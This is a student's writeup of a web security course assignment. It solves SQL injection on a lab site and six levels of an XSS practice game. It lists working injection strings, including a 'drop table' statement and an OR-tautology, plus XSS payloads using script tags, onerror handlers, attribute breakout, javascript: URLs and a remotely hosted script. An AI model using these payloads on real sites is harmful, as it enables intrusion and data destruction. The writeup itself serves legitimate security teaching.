
Writeup 14 - Web
=====

Name: John
Section: 0102

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: John

## Assignment 14 Writeup

### Part 1 (70 Pts)

The letters S Q L are bolded so I assumed I would be doing some SQL injection. The product pages have an id field in the query string. [http://cornerstoneairlines.co:8080/item?id=0](http://cornerstoneairlines.co:8080/item?id=0)

Putting a single quote in for the id makes the server fail and return a 500 response code, so it appears they are not sanitizing the input and the single quote messed up the sql query.



I tried a bunch of different queries in attempts to get some exciting output but they all failed to produce anything interesting.
[http://cornerstoneairlines.co:8080/item?id=QUERY](http://cornerstoneairlines.co:8080/item?id=QUERY)
```
0'
0' or true --
0' or true limit 1 --
'; select * from items limit 1 --
'; drop table items; --
```

I saw the price had the meme number 1337, so I thought why not try it for the id. It gave me a flag. [http://cornerstoneairlines.co:8080/item?id=1337](http://cornerstoneairlines.co:8080/item?id=1337)

````CMSC38R-{y0U-are_the_5ql_n1nja}````

I assumed this wasn’t the actual flag I was looking for, so I reviewed the slides for some additional hints.

Eventually I tried using the ```'1'='1'``` syntax as provided in the slides and was able to see all the items in the database.

`' or 1='1`

That gave me the same flag I found before.

````CMSC38R-{y0U-are_the_5ql_n1nja}````

I found it interesting that all my statements using sql comments failed. With enough trial and error, I figured out that my browser was removing the spaces after the two dashes, so the comment didn’t work. When I manually encode the last space, it works. ![https://i.imgur.com/uutke0x.png](https://i.imgur.com/uutke0x.png)

### Part 2 (30 Pts)

Level 1

Just putting ``` <script>alert()</script>``` in the input box works as the server renders the query directly into the html.

Level 2

I struggled a bit because I am not that familiar with all the html attributes. The hints made it very clear. Use the onerror attribute of image to execute a script. ``` <img src="/" onerror="alert()"></img>```

Level 3

When generating the html to display the image, the num value isn’t sanitized. ```  `html += "<img` `src='/static/level3/cloud" + num + ".jpg'` `/>";``` `

You can close off the src attribute and insert more attributes. ``` https://xss-game.appspot.com/level3/frame#9' onerror='alert()'```

Level 4

The server side html rendering engine puts the value of the timer variable in the onload method of the image. You can use this to execute additional javascript statements. ``` 1'); alert('3```

Level 5

The server naively writes the value of the ```next``` field from the query into the html. It sets the href of a link to this value. You can pass it ``` javascript:alert()``` and it will execute the alert when the link is clicked.

Level 6

This level was very simple for being the final one. It loads the script from a url provided in the hash or the site’s url. Luckily, I found someone hosting a xss payload with an alert in it.  ``` https://xss-game.appspot.com/level6/frame#//xss.rocks/xss.js```
